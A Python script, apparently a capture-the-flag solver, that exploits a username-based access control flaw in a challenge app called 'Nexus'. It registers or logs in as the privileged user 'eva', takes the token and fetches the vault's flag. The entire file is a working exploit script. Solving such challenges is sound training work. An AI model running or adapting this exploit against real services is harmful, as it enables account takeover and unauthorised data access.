import argparse
import json
import secrets
import sys
import urllib.error
import urllib.request


DEFAULT_BASE_URL = "https://adamlogin.vercel.app"
DEFAULT_USERNAME = "eva"


def request_json(method, url, payload=None, headers=None):
    body = None if payload is None else json.dumps(payload).encode()
    request_headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    }
    if payload is not None:
        request_headers["Content-Type"] = "application/json"
    if headers:
        request_headers.update(headers)

    request = urllib.request.Request(url, data=body, headers=request_headers, method=method)
    try:
        with urllib.request.urlopen(request) as response:
            raw_body = response.read().decode("utf-8", errors="replace")
            return response.status, parse_json(raw_body), raw_body
    except urllib.error.HTTPError as error:
        raw_body = error.read().decode("utf-8", errors="replace")
        return error.code, parse_json(raw_body), raw_body


def parse_json(raw_body):
    try:
        return json.loads(raw_body)
    except json.JSONDecodeError:
        return None


def extract_token(response_json):
    if isinstance(response_json, dict):
        token = response_json.get("token")
        if isinstance(token, str) and token:
            return token
    return None


def register(base_url, username, password):
    return request_json(
        "POST",
        f"{base_url}/api/register",
        payload={"username": username, "password": password},
    )


def login(base_url, username, password):
    return request_json(
        "POST",
        f"{base_url}/api/login",
        payload={"username": username, "password": password},
    )


def get_vault(base_url, token):
    return request_json(
        "GET",
        f"{base_url}/api/vault",
        headers={"x-token": token},
    )


def solve(base_url, username, password):
    status_code, response_json, raw_body = register(base_url, username, password)
    token = extract_token(response_json)

    if token:
        print(f"[+] Registered {username!r} and received a token")
        return token

    print(f"[-] Register returned {status_code}: {raw_body}")
    print(f"[*] Falling back to login for {username!r}")

    status_code, response_json, raw_body = login(base_url, username, password)
    token = extract_token(response_json)
    if token:
        print(f"[+] Logged in as {username!r}")
        return token

    raise RuntimeError(f"login failed with status {status_code}: {raw_body}")


def main():
    parser = argparse.ArgumentParser(
        description="Exploit the Nexus username-based vault access control flaw.",
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="Target base URL")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help="Privileged username to claim")
    parser.add_argument(
        "--password",
        default=None,
        help="Password to register/login with. Defaults to a random value.",
    )
    args = parser.parse_args()

    password = args.password or f"Pwned-{secrets.token_hex(8)}"

    try:
        token = solve(args.base_url.rstrip("/"), args.username, password)
        status_code, response_json, raw_body = get_vault(args.base_url.rstrip("/"), token)
        if status_code != 200:
            raise RuntimeError(f"vault request failed with status {status_code}: {raw_body}")

        if not isinstance(response_json, dict) or "flag" not in response_json:
            raise RuntimeError(f"vault response did not contain a flag: {raw_body}")

        print(f"[+] Token: {token}")
        print(f"[+] Flag: {response_json['flag']}")
        return 0
    except Exception as error:
        print(f"[!] Exploit failed: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())